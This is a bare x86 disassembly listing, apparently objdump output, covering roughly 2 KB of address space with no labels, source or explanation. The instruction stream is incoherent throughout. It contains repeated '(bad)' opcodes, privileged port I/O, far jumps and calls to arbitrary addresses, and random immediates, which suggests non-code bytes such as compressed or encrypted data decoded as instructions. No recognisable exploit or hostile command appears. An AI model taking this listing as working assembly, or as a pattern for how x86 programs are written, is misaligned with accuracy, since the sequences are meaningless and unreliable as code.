  482891:	lods   al,BYTE PTR ds:[esi]
  482892:	or     edx,ecx
  482894:	inc    eax
  482895:	xchg   edx,eax
  482896:	pop    esp
  482897:	mov    esi,0xc4dca99
  48289c:	jle    0x4828b0
  48289e:	or     al,0x3e
  4828a0:	gs or  eax,0xcec048f0
  4828a6:	pop    edx
  4828a7:	xadd   BYTE PTR [edx-0x811eb3b],al
  4828ae:	ficom  WORD PTR [esi+0x65994443]
  4828b4:	loop   0x4828d1
  4828b6:	or     DWORD PTR [ecx+0x49],0x37493e0f
  4828bd:	(bad)  
  4828be:	jae    0x48289b
  4828c0:	mov    ecx,ecx
  4828c2:	mov    ah,0x30
  4828c4:	das    
  4828c5:	daa    
  4828c6:	(bad)  
  4828c8:	ret    0xb905
  4828cb:	out    dx,eax
  4828cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4828cd:	mov    eax,0x46476d8
  4828d2:	bound  ebx,QWORD PTR [ebx-0x21]
  4828d5:	mov    ds:0xfbff8803,eax
  4828da:	mov    edi,ebx
  4828dc:	cmp    esi,DWORD PTR [edi+0x4]
  4828df:	fld    DWORD PTR [esi+0x31]
  4828e2:	ret    0x68e8
  4828e5:	add    DWORD PTR [eax],esp
  4828e7:	mov    ds:0xf6b83c1f,eax
  4828ec:	push   DWORD PTR [edi+0x10]
  4828ef:	add    al,0xc
  4828f1:	push   ds
  4828f2:	add    edx,eax
  4828f4:	sub    BYTE PTR [ebx],al
  4828f6:	mov    DWORD PTR [edi-0x74],esi
  4828f9:	dec    ebp
  4828fb:	outs   dx,DWORD PTR ds:[esi]
  4828fc:	pusha  
  4828fd:	sar    DWORD PTR [ebx],cl
  4828ff:	jb     0x482909
  482901:	jne    0x48290b
  482903:	mov    BYTE PTR [edx+0x14],0x1
  482907:	jmp    0x48291a
  482909:	cmp    esi,DWORD PTR [edx]
  48290b:	jne    0x482917
  48290d:	add    al,0x9a
  48290f:	or     eax,0x4a7c9431
  482914:	mov    bh,0x2e
  482916:	jecxz  0x482933
  482918:	imul   ecx,DWORD PTR [edi+0x492b87d7],0xffffffca
  48291f:	(bad)  
  482920:	fiadd  DWORD PTR [ecx]
  482922:	jmp    0xf7ea:0x5d3e809f
  482929:	ficom  DWORD PTR [eax]
  48292b:	(bad)  
  48292c:	in     al,dx
  48292d:	adc    eax,0x6adf4a16
  482932:	add    al,0xd1
  482934:	mov    eax,0xc2f2ca21
  482939:	or     DWORD PTR ds:0xac0bec42,0x5b183c45
  482943:	ss test eax,0x2a30f46a
  482949:	jne    0x48297b
  48294b:	adc    al,0xf7
  48294d:	pop    edx
  48294e:	push   cs
  48294f:	dec    edx
  482950:	mov    ebx,edi
  482952:	pop    ebp
  482953:	cmp    al,0x29
  482955:	adc    DWORD PTR [edx+0x7b],edx
  482958:	ss or  al,0xf3
  48295b:	inc    ecx
  48295c:	fdivr  QWORD PTR [ebx]
  48295e:	inc    ecx
  48295f:	imul   esi,DWORD PTR [esi+0x7d],0x42443be8
  482966:	pop    es
  482967:	xchg   edx,eax
  482968:	inc    edx
  482969:	in     al,dx
  48296a:	add    BYTE PTR fs:[edi+0x40],cl
  48296e:	je     0x482992
  482970:	pop    edx
  482971:	mov    edx,0xa5c03db0
  482976:	in     al,0xeb
  482978:	sub    dl,BYTE PTR [ecx-0x67]
  48297b:	and    BYTE PTR [esi+0x2902c427],dh
  482981:	dec    ecx
  482982:	addr16 mov al,ds:0x43b5
  482986:	add    eax,esi
  482988:	lods   eax,DWORD PTR ds:[esi]
  482989:	pop    edx
  48298a:	outs   dx,DWORD PTR ds:[esi]
  48298b:	inc    eax
  48298c:	mov    al,BYTE PTR [esi-0x77]
  48298f:	sti    
  482990:	or     dh,ah
  482992:	sbb    edi,ebx
  482994:	(bad)  
  482995:	push   ss
  482996:	hlt    
  482997:	push   0x5473e558
  48299c:	or     eax,0x3f529a04
  4829a1:	xor    al,bh
  4829a3:	push   edx
  4829a4:	add    DWORD PTR [esi-0x2bd56bbb],0xffffff83
  4829ab:	mov    dl,0xa5
  4829ad:	icebp  
  4829ae:	lea    ecx,[ecx+edx*1]
  4829b1:	dec    eax
  4829b2:	dec    eax
  4829b3:	or     BYTE PTR [eax-0x3ba1c3ac],0x91
  4829ba:	sar    BYTE PTR [ebp+edi*4-0x15],cl
  4829be:	dec    ebp
  4829bf:	inc    esp
  4829c0:	push   ss
  4829c1:	inc    ecx
  4829c2:	in     eax,dx
  4829c3:	sub    DWORD PTR [edi],esp
  4829c5:	ret    
  4829c6:	sbb    al,BYTE PTR [eax-0x477cff08]
  4829cc:	mov    al,ds:0x8b21183d
  4829d1:	sub    BYTE PTR [edi+ecx*1-0x6c],ch
  4829d5:	cmp    BYTE PTR [edi],0x3b
  4829d8:	shl    BYTE PTR [ecx+ebx*1+0x9],0xc6
  4829dd:	mov    ecx,0x6dbf623
  4829e2:	or     eax,0x3d8d251d
  4829e7:	fadd   DWORD PTR [ecx]
  4829e9:	add    ch,0xb8
  4829ec:	inc    edi
  4829ed:	cs aad 0xad
  4829f0:	loopne 0x482a03
  4829f2:	xchg   edi,eax
  4829f3:	and    eax,0xfed59ec
  4829f8:	cmp    esi,DWORD PTR [esi+0x55208df0]
  4829fe:	js     0x4829aa
  482a00:	jmp    0xc3f4af08
  482a05:	lahf   
  482a06:	lock lea edi,[ebp-0x9]
  482a0a:	mov    bh,0x15
  482a0c:	mov    WORD PTR [ebx-0x7c30f1f8],es
  482a12:	cmp    eax,0x46c9e166
  482a17:	rcr    DWORD PTR ds:0x442aea45,0x11
  482a1e:	adc    eax,0xddf4003
  482a23:	clc    
  482a24:	test   ax,0x8000
  482a28:	cwde   
  482a29:	iret   
  482a2a:	jo     0x482a9a
  482a2c:	add    esi,esi
  482a2e:	xor    al,BYTE PTR [edx-0x5e7ecb4c]
  482a34:	in     al,dx
  482a35:	les    edi,FWORD PTR [ebp+0x7a8b6132]
  482a3b:	mov    eax,ds:0xc49112e8
  482a40:	std    
  482a41:	call   0x2140:0xbc8c0ffd
  482a48:	leave  
  482a49:	or     ecx,edi
  482a4b:	iret   
  482a4c:	sub    edi,DWORD PTR [ebx-0x21]
  482a4f:	mov    bl,0x51
  482a51:	lock pop ebx
  482a53:	(bad)  
  482a54:	lock rcl DWORD PTR [esi],cl
  482a57:	cmp    BYTE PTR [eax-0x209bfbf5],0xa6
  482a5e:	add    DWORD PTR [ecx+0x23bb1f86],edx
  482a64:	sbb    ebp,DWORD PTR [ecx]
  482a66:	mov    eax,0xe071167a
  482a6b:	lsl    edi,ax
  482a6e:	mov    BYTE PTR [eax+0xc],ch
  482a71:	xlat   BYTE PTR ds:[ebx]
  482a72:	pop    eax
  482a73:	js     0x482a91
  482a75:	xor    bl,BYTE PTR [eax]
  482a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  482a78:	pop    ebp
  482a79:	into   
  482a7a:	gs pop edx
  482a7c:	adc    ecx,0x7f
  482a7f:	bound  eax,QWORD PTR [edx+0x55]
  482a82:	dec    edi
  482a83:	mov    WORD PTR [eax+0x7e],cs
  482a86:	inc    esp
  482a87:	inc    ebp
  482a88:	jo     0x482ae5
  482a8a:	sub    BYTE PTR [esi],dl
  482a8c:	dec    edi
  482a8d:	idiv   edi
  482a8f:	sub    cl,BYTE PTR [eax-0x50]
  482a92:	cmp    BYTE PTR [edx+0x270a300e],dh
  482a98:	(bad)  
  482a99:	push   cs
  482a9a:	imul   ebp,DWORD PTR [edx+0x4d],0xf704fb24
  482aa1:	fmul   DWORD PTR es:0xd077fe03
  482aa8:	dec    esi
  482aa9:	in     al,dx
  482aaa:	mov    edx,eax
  482aac:	iret   
  482aad:	and    al,0x47
  482aaf:	dec    ebx
  482ab0:	jne    0x91f472fd
  482ab6:	or     BYTE PTR [ebx+eiz*1],bh
  482ab9:	leave  
  482aba:	or     eax,0x245c339
  482abf:	jo     0x482a75
  482ac1:	dec    ecx
  482ac2:	adc    esi,DWORD PTR [esi-0x5]
  482ac5:	mov    eax,ds:0x2012303c
  482aca:	aad    0xc0
  482acc:	mov    eax,ds:0xc1a722e8
  482ad1:	(bad)  
  482ad2:	mov    bh,BYTE PTR [ecx]
  482ad4:	jg     0x482acc
  482ad6:	je     0x482ae0
  482ad8:	dec    esp
  482ad9:	loopne 0x482a62
  482adb:	dec    esi
  482adc:	popf   
  482add:	push   ds
  482ade:	xchg   esp,eax
  482adf:	and    eax,0x90f86b5a
  482ae4:	push   ebp
  482ae5:	(bad)  
  482ae6:	cmp    esi,DWORD PTR [edx+0x140ff6c4]
  482aec:	adc    DWORD PTR [eax+0x75],eax
  482aef:	pop    ds
  482af0:	and    eax,0x120fb18f
  482af5:	mov    al,ds:0x25d03138
  482afa:	or     BYTE PTR [ebx-0x18972dae],al
  482b00:	and    DWORD PTR [eax+0x6e809503],0xffffff84
  482b07:	cmp    al,0x64
  482b09:	fild   DWORD PTR [eax-0x7de63b65]
  482b0f:	fidiv  WORD PTR [esi+edx*8-0x13a26fa2]
  482b16:	sbb    cl,BYTE PTR [edx+esi*1]
  482b19:	hlt    
  482b1a:	or     bh,ah
  482b1c:	lock cmp BYTE PTR ds:0x443d42e0,0xe1
  482b24:	jbe    0x482b9b
  482b26:	dec    ebp
  482b27:	loopne 0x482b86
  482b29:	add    BYTE PTR [esi+0x2],dl
  482b2c:	call   0x689ae382
  482b31:	das    
  482b32:	mov    al,0xaa
  482b34:	push   cs
  482b35:	pop    eax
  482b36:	add    eax,0x5bdf5225
  482b3b:	cdq    
  482b3c:	cmp    BYTE PTR [edx+0x16],dl
  482b3f:	lock sbb ecx,DWORD PTR [edi+0x54]
  482b43:	leave  
  482b44:	sbb    DWORD PTR [esp+eiz*4+0x56],0x17
  482b49:	inc    esp
  482b4a:	cmp    ah,BYTE PTR [ecx+0x44e49bb4]
  482b50:	or     eax,0x1a6d47b0
  482b55:	mov    ebp,0x68697c01
  482b5a:	lahf   
  482b5b:	jmp    0x482bad
  482b5d:	js     0x482ba5
  482b5f:	push   edx
  482b60:	les    ebx,FWORD PTR ds:0x4210381b
  482b66:	dec    edx
  482b67:	jmp    FWORD PTR [ecx-0x60]
  482b6a:	mov    bh,0x89
  482b6c:	inc    edi
  482b6d:	and    al,0x38
  482b6f:	xchg   ebp,eax
  482b70:	pop    ss
  482b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  482b72:	sbb    DWORD PTR [edi],ecx
  482b74:	jnp    0x482bbd
  482b76:	fnstenv [eax-0x16ccf376]
  482b7c:	adc    al,0xae
  482b7e:	xor    BYTE PTR ds:0x5da75197,ah
  482b84:	lahf   
  482b85:	nop
  482b86:	dec    eax
  482b87:	fdiv   QWORD PTR [ebx-0x58917614]
  482b8d:	aas    
  482b8e:	mov    eax,ds:0x8b06ea06
  482b93:	or     eax,0x7905b277
  482b98:	add    al,0xe2
  482b9a:	add    DWORD PTR [ebx],ecx
  482b9c:	es and ch,dh
  482b9f:	js     0x482b3e
  482ba1:	push   edx
  482ba2:	cs inc edi
  482ba4:	pushf  
  482ba5:	ins    BYTE PTR es:[edi],dx
  482ba6:	adc    eax,0xad30b80
  482bab:	lahf   
  482bac:	retw   0x51a
  482bb0:	loope  0x482bc4
  482bb2:	xchg   edi,eax
  482bb3:	mov    ds:0x406469f1,al
  482bb8:	xchg   esp,eax
  482bb9:	sti    
  482bba:	jb     0x482b77
  482bbc:	jmp    0xa156:0x25607c46
  482bc3:	push   eax
  482bc4:	daa    
  482bc5:	or     cl,al
  482bc7:	mov    dh,0x94
  482bc9:	imul   edi,DWORD PTR [ecx],0xbe71d38b
  482bcf:	sub    edx,DWORD PTR [edx-0x57]
  482bd2:	inc    edi
  482bd3:	adc    eax,0x13bd7081
  482bd8:	adc    BYTE PTR [edi+0x7f],0x80
  482bdc:	mov    esi,0x8376f5a7
  482be1:	mov    esi,0xf87b778
  482be6:	lock adc DWORD PTR [ebp+0x2b],ebp
  482bea:	dec    esi
  482beb:	clc    
  482bec:	jl     0x482c50
  482bee:	adc    eax,0xab93c148
  482bf3:	ret    0x1875
  482bf6:	xchg   BYTE PTR cs:[edi],bh
  482bf9:	sbb    eax,0x6ec2cf03
  482bfe:	shl    BYTE PTR [eax],1
  482c00:	cmp    BYTE PTR [eax+eax*2-0x3],dh
  482c04:	ds fsubrp st(5),st
  482c07:	sub    BYTE PTR [ebp+0x550c8015],ch
  482c0d:	rcl    DWORD PTR [ebp-0x55],cl
  482c10:	add    eax,0xf88cb442
  482c15:	and    DWORD PTR [edx],0x21
  482c18:	shl    DWORD PTR [eax+0xcd64506],0xe3
  482c1f:	or     ebp,DWORD PTR [esi]
  482c21:	or     DWORD PTR [ebx+ecx*8-0x3c],ebx
  482c25:	xor    BYTE PTR [esi+0x611714d3],0x95
  482c2c:	adc    ebp,DWORD PTR [edi-0x7b1e1408]
  482c32:	out    dx,eax
  482c33:	mov    ch,BYTE PTR [esi]
  482c35:	sub    eax,0x2b0ed0a1
  482c3a:	pop    es
  482c3b:	add    eax,0x53fbb695
  482c40:	push   esi
  482c41:	fdivr  QWORD PTR [ebp+0x19]
  482c44:	mov    eax,ds:0x44727d4
  482c49:	sub    eax,esi
  482c4b:	addr16 icebp 
  482c4d:	pop    esp
  482c4e:	xchg   esp,eax
  482c4f:	mov    WORD PTR [ecx+0xb85c002],cs
  482c55:	mov    cl,BYTE PTR [eax+0x450e0f9b]
  482c5b:	bound  ecx,QWORD PTR [ecx+ebp*1+0x4f3cda26]
  482c62:	adc    al,0xd
  482c64:	xor    esp,DWORD PTR [edi-0x5c1b5dda]
  482c6a:	jne    0x482c0d
  482c6c:	add    ebx,DWORD PTR [esi+0x1d]
  482c6f:	xchg   ecx,eax
  482c70:	dec    edi
  482c71:	rcl    BYTE PTR [esi+0x3df940d],1
  482c77:	xlat   BYTE PTR ds:[ebx]
  482c78:	aad    0xa1
  482c7a:	xor    eax,0x8d1c7f46
  482c7f:	cmp    BYTE PTR [eax+0x236e8532],0x68
  482c86:	mov    BYTE PTR ds:0xe7660179,0xd8
  482c8d:	ss lahf 
  482c8f:	jmp    0x482ca4
  482c91:	xchg   ebp,eax
  482c92:	sub    al,0x1c
  482c94:	xor    eax,DWORD PTR [edx]
  482c96:	jecxz  0x482ca2
  482c98:	and    al,0x1e
  482c9a:	add    eax,0x903e4bc8
  482c9f:	push   0x94da133b
  482ca4:	retf   0xa9c4
  482ca7:	out    dx,eax
  482ca8:	xor    al,0xf1
  482caa:	int3   
  482cab:	cmp    ecx,DWORD PTR [bx+di+0x440f]
  482cb0:	add    DWORD PTR [ebx+0x150893ce],esi
  482cb6:	pop    ss
  482cb7:	xor    DWORD PTR [ebx],edx
  482cb9:	or     al,0xfb
  482cbb:	jb     0x482d14
  482cbd:	add    al,0xa
  482cbf:	or     al,0x6d
  482cc1:	add    ch,BYTE PTR [edi]
  482cc3:	mov    ah,0x33
  482cc5:	mov    eax,0x9a671f47
  482cca:	call   0x436e7ffb
  482ccf:	data16 mov bl,0xef
  482cd2:	mov    bl,ch
  482cd4:	add    al,0x74
  482cd6:	mul    DWORD PTR [ecx+ebx*1-0x2add1ac]
  482cdd:	mov    dl,0xd1
  482cdf:	mov    esp,0x180c0c14
  482ce4:	(bad)  
  482ce5:	mov    al,0x2
  482ce7:	and    al,0x81
  482ce9:	in     al,dx
  482cea:	loopne 0x482c9d
  482cec:	ret    0x430f
  482cef:	sub    al,0x86
  482cf1:	shl    DWORD PTR [edx+edi*8+0x86a0b4a],0xa
  482cf9:	push   ecx
  482cfa:	mov    ebx,0x20517200
  482cff:	mov    cl,BYTE PTR [edx-0x297dc406]
  482d05:	std    
  482d06:	add    al,0x13
  482d08:	cmp    BYTE PTR [eax+0x6a],0x4e
  482d0c:	ret    
  482d0d:	xor    DWORD PTR [eax+ebp*2+0x410f4988],ebx
  482d14:	jmp    0x482d46
  482d16:	mul    BYTE PTR [ecx+0x16]
  482d19:	test   cl,ah
  482d1b:	and    DWORD PTR [eax+0x171feb04],eax
  482d21:	popf   
  482d22:	sbb    edx,0x3e
  482d25:	js     0x482d36
  482d27:	mov    edi,0xef737096
  482d2c:	aad    0x38
  482d2e:	xchg   DWORD PTR [edx-0x40],ebp
  482d31:	pop    esi
  482d32:	push   edi
  482d33:	dec    eax
  482d34:	sub    ecx,eax
  482d36:	test   edi,eax
  482d38:	cmp    BYTE PTR [edx+0x65],0x2
  482d3c:	outs   dx,DWORD PTR ds:[esi]
  482d3d:	sbb    ch,BYTE PTR [ecx]
  482d3f:	rcl    BYTE PTR [edi],0x78
  482d42:	pop    es
  482d43:	push   ebp
  482d44:	push   eax
  482d45:	cmp    BYTE PTR [edx+0x60dde7fe],dl
  482d4b:	pop    edx
  482d4c:	sbb    al,0xeb
  482d4e:	pop    esp
  482d4f:	xchg   ecx,eax
  482d50:	rcr    BYTE PTR [ecx-0x7df3d2a8],1
  482d56:	out    dx,eax
  482d57:	pop    eax
  482d58:	and    al,0x17
  482d5a:	(bad)  
  482d5b:	ficom  WORD PTR [ecx]
  482d5d:	pop    edx
  482d5e:	fadd   DWORD PTR [eax+ebp*8-0x77c4dd77]
  482d65:	inc    edx
  482d66:	push   esp
  482d67:	adc    al,0x3d
  482d69:	push   ds
  482d6a:	push   esi
  482d6b:	fisttp DWORD PTR [edi]
  482d6d:	dec    ecx
  482d6e:	and    al,0x6c
  482d70:	ins    DWORD PTR es:[edi],dx
  482d71:	dec    eax
  482d72:	lods   eax,DWORD PTR ds:[esi]
  482d73:	sbb    bl,al
  482d75:	dec    ebp
  482d76:	out    dx,eax
  482d77:	dec    ecx
  482d78:	inc    edx
  482d79:	cld    
  482d7a:	or     bh,BYTE PTR [esi+0x5c53a51d]
  482d80:	bnd jo 0x482db6
  482d83:	and    al,0xb
  482d85:	addr16 dec ebx
  482d87:	sub    cl,BYTE PTR [ebx]
  482d89:	mov    esp,0xaf710df
  482d8e:	aad    0xd2
  482d90:	repz adc ecx,ebx
  482d93:	mov    cl,0x34
  482d95:	adc    esi,DWORD PTR [eax]
  482d97:	add    al,0x78
  482d99:	pop    esp
  482d9a:	pop    bx
  482d9c:	fmul   DWORD PTR [eax+0x1b9eef57]
  482da2:	xchg   ebx,eax
  482da3:	cmp    dl,bl
  482da5:	pop    edx
  482da6:	dec    ecx
  482da7:	push   ebx
  482da8:	es js  0x482d9f
  482dab:	add    BYTE PTR [ebp+0x68],0xdf
  482daf:	fimul  DWORD PTR [ebx+0x5b]
  482db2:	mov    eax,0x1fb859c8
  482db7:	aam    0x10
  482db9:	aam    0xfd
  482dbb:	lea    esi,[eax-0x4fc8ef45]
  482dc1:	mov    ds:0x582a69d8,eax
  482dc6:	mov    ds:0x618894cc,eax
  482dcb:	aam    0x37
  482dcd:	cmp    eax,0xc4d92fe7
  482dd2:	addr16 push ss
  482dd4:	mov    ebx,0x44428dd6
  482dd9:	pop    ebp
  482dda:	push   0x49
  482ddc:	aas    
  482ddd:	push   esp
  482dde:	or     BYTE PTR [ebx],ch
  482de0:	stc    
  482de1:	loopne 0x482dcf
  482de3:	jp     0x482e3f
  482de5:	add    eax,DWORD PTR [ecx-0x76eff349]
  482deb:	cmp    al,0x24
  482ded:	fisttp DWORD PTR [esi-0xf7d9b8]
  482df3:	call   0xdb923011
  482df8:	push   0xffffffde
  482dfa:	stc    
  482dfb:	fstp   QWORD PTR [edx+0x20]
  482dfe:	fwait
  482dff:	add    bh,BYTE PTR [ebx]
  482e01:	jnp    0x482dc7
  482e03:	jmp    0x482e0d
  482e05:	ins    BYTE PTR es:[edi],dx
  482e06:	and    BYTE PTR [eax+edi*1],al
  482e09:	out    dx,al
  482e0a:	and    al,0x6d
  482e0c:	mov    ds:0xca2bd281,al
  482e11:	mov    esi,0xd8ecd623
  482e16:	fiadd  WORD PTR [eax-0x5d4ef87]
  482e1c:	imul   esi,esi,0x2b
  482e1f:	push   eax
  482e20:	push   esp
  482e21:	ins    DWORD PTR es:[edi],dx
  482e22:	fwait
  482e23:	inc    eax
  482e24:	loopne 0x482e62
  482e26:	pop    ecx
  482e27:	sub    BYTE PTR [ecx+0x2a9b061],bl
  482e2d:	call   0xaf642f42
  482e32:	sub    DWORD PTR [ebx],edx
  482e34:	rcl    BYTE PTR [ebx],0x92
  482e37:	pop    ds
  482e38:	dec    edx
  482e39:	adc    al,0x38
  482e3b:	or     DWORD PTR [esi],edi
  482e3d:	xchg   ch,ch
  482e3f:	dec    ebp
  482e40:	outs   dx,DWORD PTR ds:[esi]
  482e41:	jmp    0x482e4a
  482e43:	sub    esp,DWORD PTR [ebp+0x8]
  482e46:	mov    ds:0x40481de4,eax
  482e4b:	jne    0x482e62
  482e4d:	repnz pop esp
  482e4f:	dec    eax
  482e50:	fwait
  482e51:	int3   
  482e52:	enter  0x42de,0xec
  482e56:	call   DWORD PTR [ebx-0xe]
  482e59:	nop
  482e5a:	push   ebx
  482e5b:	ins    BYTE PTR es:[edi],dx
  482e5c:	push   ecx
  482e5d:	mov    esp,DWORD PTR [esi]
  482e5f:	sub    eax,0x2f9b3c6c
  482e64:	loopne 0x482e6a
  482e66:	loopne 0x482e89
  482e68:	and    eax,0xd0587908
  482e6d:	cwde   
  482e6e:	mov    esp,0x1bf159ac
  482e73:	pusha  
  482e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  482e75:	jmp    0x4bbf:0xbec81c14
  482e7c:	inc    ebp
  482e7d:	cmp    bh,BYTE PTR [ecx+ecx*1-0x5f23d5ed]
  482e84:	in     eax,0x52
  482e86:	push   cs
  482e87:	out    0x72,eax
  482e89:	pushf  
  482e8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  482e8b:	push   cs
  482e8c:	sub    eax,0x226bf2e1
  482e91:	jns    0x482ec3
  482e93:	xor    DWORD PTR [eax-0x25],ecx
  482e96:	iret   
  482e97:	and    al,0xa8
  482e99:	mov    ebx,0x90331dd6
  482e9e:	dec    ecx
  482e9f:	popf   
  482ea0:	add    DWORD PTR [ebp+0x3e],ecx
  482ea3:	xchg   ebp,eax
  482ea4:	xchg   edi,eax
  482ea5:	fbld   TBYTE PTR [ecx+0x1875e3e4]
  482eab:	(bad)  
  482eac:	cld    
  482ead:	mov    esp,0x44887ad3
  482eb2:	xchg   edx,eax
  482eb3:	pusha  
  482eb4:	icebp  
  482eb5:	cmp    BYTE PTR [ebp+ebx*2+0x23],cl
  482eb9:	sub    al,0xbf
  482ebb:	cmp    DWORD PTR [ecx],ebx
  482ebd:	pop    ebp
  482ebe:	xor    eax,DWORD PTR [eax+0x5044e5ad]
  482ec4:	rcr    eax,0x98
  482ec7:	mov    DWORD PTR [edx-0x2a],edi
  482eca:	fwait
  482ecb:	xor    DWORD PTR [edi-0x7d],ebx
  482ece:	jle    0x482f00
  482ed0:	shr    BYTE PTR [ebx+0x7b],1
  482ed3:	cmp    al,0xc3
  482ed5:	mov    ah,0x9c
  482ed7:	jge    0x482ea3
  482ed9:	dec    ebx
  482eda:	jno    0x482ec1
  482edc:	adc    DWORD PTR [eax-0x14b7bba8],0x28
  482ee3:	pop    esp
  482ee4:	sbb    al,dh
  482ee6:	adc    esp,DWORD PTR ss:[edi-0x32]
  482eea:	test   BYTE PTR [ecx-0x4b4711df],ah
  482ef0:	in     eax,dx
  482ef1:	jae    0x482eec
  482ef3:	sahf   
  482ef4:	inc    esi
  482ef5:	js     0x482f4a
  482ef7:	call   0x1cbdbae8
  482efc:	push   esi
  482efd:	fdivr  DWORD PTR [ebx+0x2948bbff]
  482f03:	js     0x482f3d
  482f05:	add    edx,DWORD PTR [edi+0x4c]
  482f08:	mov    eax,DWORD PTR [esi+0x44]
  482f0b:	add    eax,DWORD PTR [edi+0x48]
  482f0e:	pop    edx
  482f0f:	jno    0x482f68
  482f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  482f12:	xor    al,0xdd
  482f14:	gs dec esp
  482f16:	push   eax
  482f17:	sbb    al,0xd
  482f19:	sbb    DWORD PTR [esi],esp
  482f1b:	jge    0x482f94
  482f1d:	sub    bl,dl
  482f1f:	and    ch,BYTE PTR [eax+0x169d40de]
  482f25:	add    al,0xc8
  482f27:	xor    al,0x49
  482f29:	cmp    al,al
  482f2b:	pusha  
  482f2c:	xor    DWORD PTR [ebp+0x6d8f1545],ebp
  482f32:	loope  0x482eb8
  482f34:	adc    ebx,edx
  482f36:	hlt    
  482f37:	lock scas al,BYTE PTR es:[edi]
  482f39:	inc    edx
  482f3a:	pushf  
  482f3b:	sub    dh,dh
  482f3d:	push   ebx
  482f3e:	push   ebp
  482f3f:	jne    0x482f8b
  482f41:	(bad)  
  482f42:	xchg   esp,eax
  482f43:	jle    0x482f71
  482f45:	mov    edx,DWORD PTR ss:[esi+esi*2+0x47]
  482f4a:	sbb    DWORD PTR [ecx-0x5cd4e40f],ecx
  482f50:	mov    cl,0x4c
  482f52:	mov    eax,0xb03f2a59
  482f57:	and    ebx,DWORD PTR [esi+0x55]
  482f5a:	out    dx,al
  482f5b:	loope  0x482f0b
  482f5d:	xchg   edi,eax
  482f5e:	add    al,0x36
  482f60:	or     eax,0x90befa33
  482f65:	adc    eax,DWORD PTR [edx]
  482f67:	sub    DWORD PTR es:[edi+0x4f14ed24],ebx
  482f6e:	add    bl,bl
  482f70:	mov    BYTE PTR [ecx-0x1c],0x50
  482f74:	loopne 0x482fbb
  482f76:	inc    BYTE PTR [eax]
  482f78:	or     esi,DWORD PTR [esi-0x9befdfe]
  482f7e:	cmp    BYTE PTR [ebx+0x30],bl
  482f81:	sbb    al,0x85
  482f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  482f84:	fwait
  482f85:	mov    eax,0x56f909f4
  482f8a:	jp     0x482fc5
  482f8c:	into   
  482f8d:	das    
  482f8e:	inc    esi
  482f8f:	test   al,0x36
  482f91:	cld    
  482f92:	test   esi,0x11013040
  482f98:	mov    dl,BYTE PTR [ebp-0x1]
  482f9b:	mov    BYTE PTR [eax+0x56],dl
  482f9e:	adc    eax,0x8cc499cc
  482fa3:	and    DWORD PTR [eax],ebx
  482fa5:	mov    al,ds:0x13dd239f
  482faa:	rcl    BYTE PTR [edi-0x3cd0133f],cl
  482fb0:	sub    al,dh
  482fb2:	or     al,al
  482fb4:	cli    
  482fb5:	in     al,0x43
  482fb7:	ins    BYTE PTR es:[edi],dx
  482fb8:	cmc    
  482fb9:	or     al,0xa9
  482fbb:	adc    al,ah
  482fbd:	sub    dl,bh
  482fbf:	enter  0x422f,0xd9
  482fc3:	je     0x483002
  482fc5:	adc    ebp,DWORD PTR ds:0xddb9739c
  482fcb:	mov    ah,0xf6
  482fcd:	or     bl,BYTE PTR [eax]
  482fcf:	cli    
  482fd0:	jmp    0x482fe3
  482fd2:	and    eax,0x6b61100c
  482fd7:	jl     0x482f65
  482fd9:	or     ah,cl
  482fdb:	je     0x483036
  482fdd:	pushf  
  482fde:	stc    
  482fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  482fe0:	xchg   BYTE PTR [esi],ch
  482fe2:	inc    edx
  482fe3:	sbb    ch,BYTE PTR [esp+ebp*2+0x14]
  482fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  482fe8:	loop   0x482f8f
  482fea:	inc    esp
  482feb:	sbb    BYTE PTR [ecx],dl
  482fed:	jge    0x482fd1
  482fef:	fdiv   DWORD PTR [ecx+0x49]
  482ff2:	jp     0x482fd6
  482ff4:	cmp    esi,edi
  482ff6:	arpl   WORD PTR [eax+0x436d6bb4],bp
  482ffc:	cs (bad) 
  482ffe:	push   eax
  482fff:	pop    ebp
  483000:	outs   dx,DWORD PTR ds:[esi]
  483001:	je     0x48305a
  483003:	lods   al,BYTE PTR ds:[esi]
  483004:	rcl    BYTE PTR [edi+0x1255013b],0x3b
  48300b:	push   ebx
  48300c:	cmp    cl,ah
  48300e:	loopne 0x48308b
  483010:	nop
  483011:	out    dx,al
  483012:	sub    ah,BYTE PTR [eax+edi*2-0x60f51fff]
  483019:	dec    eax
  48301a:	cwde   
  48301b:	cmp    dh,BYTE PTR [eax-0x2a87ec3]
  483021:	or     DWORD PTR [ecx+0x74f120eb],eax
  483027:	or     al,0x1
  483029:	mov    WORD PTR [esi+eax*8],es
  48302c:	gs adc dl,bh
  48302f:	fsub   st(5),st
  483031:	clc    
  483032:	sub    BYTE PTR [ebx],0x3d
  483035:	or     al,0x83
  483037:	loopne 0x48309a
  483039:	clc    
  48303a:	rcr    BYTE PTR [edx-0x10],cl
  48303d:	pop    esi
  48303e:	mov    eax,ds:0xb0530bf0
  483043:	add    esi,DWORD PTR ds:0xddc3b80
  483049:	jne    0x48306d
  48304b:	mov    al,0xe
  48304d:	sub    edx,DWORD PTR [ebx+0x48c130c]
  483053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  483054:	adc    eax,0x9f09ead8
  483059:	aaa    
  48305a:	test   al,0xac
  48305c:	cli    
  48305d:	sub    DWORD PTR [ecx+0x33a28313],esp
  483063:	and    ch,ah
  483065:	ret    0x520c
  483068:	daa    
  483069:	push   eax
  48306a:	adc    DWORD PTR [edx+0x38281118],edx
  483070:	dec    edi
  483071:	add    DWORD PTR [ebx-0x734e6169],0x6b
  483078:	pop    edx
  483079:	or     BYTE PTR [edx],bl
  48307b:	mov    esp,ebp
  48307d:	xchg   edx,eax
  48307e:	in     al,dx
  48307f:	and    eax,0xde3dbdb4
  483084:	mov    dh,0xe2
  483086:	cli    
  483087:	push   eax
  483088:	adc    al,0xfe
  48308a:	push   eax
  48308b:	and    DWORD PTR [edi-0x33ea09b3],edi
  483091:	rol    BYTE PTR [edx+0x73139646],1
  483097:	push   edi
  483098:	cs jns 0x483082
  48309b:	fdiv   DWORD PTR [edx-0x3f5f404b]
